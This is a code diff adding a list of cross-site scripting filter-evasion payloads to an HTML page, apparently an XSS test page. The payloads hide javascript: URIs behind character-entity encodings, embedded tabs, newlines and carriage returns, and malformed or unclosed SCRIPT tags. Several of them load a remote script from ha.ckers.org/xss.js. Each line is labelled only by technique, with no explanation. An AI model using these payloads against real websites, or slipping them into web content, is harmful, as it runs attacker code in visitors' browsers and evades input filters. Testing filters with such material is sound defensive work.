@@ -37,6 +37,43 @@
         
     <!-- Default SRC tag by leaving it empty -->
     <IMG SRC= onmouseover="alert('xxs')">
+        
+    <!-- Default SRC tag by leaving it out entirely -->
+    <IMG onmouseover="alert('xxs')">
+        
+    <!-- UTF-8 Unicode encoding -->
+    <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+        
+    <!-- Long UTF-8 Unicode encoding without semicolons -->
+    <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+        
+    <!-- Hex encoding without semicolons -->
+    <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+        
+    <!-- Embedded tab -->
+    <IMG SRC="jav	ascript:alert('XSS');">
+        
+    <!-- Embedded Encoded tab -->
+    <IMG SRC="jav&#x09;ascript:alert('XSS');">
     
+    <!-- Embedded newline to break up XSS -->
+    <IMG SRC="jav&#x0A;ascript:alert('XSS');">
+    
+    <!-- Embedded carriage return to break up XSS -->
+    <IMG SRC="jav&#x0D;ascript:alert('XSS');">
+        
+    <!-- Spaces and meta chars before the JavaScript in images for XSS -->
+    <IMG SRC=" &#14;  javascript:alert('XSS');">
+    
+    <!-- Non-alpha-non-digit XSS -->
+    <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+    <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+        
+    <!-- Extraneous open brackets -->
+    <<SCRIPT>alert("XSS");//<</SCRIPT>
+        
+    <!-- No closing script tags -->
+    <SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 </body>
 </html>
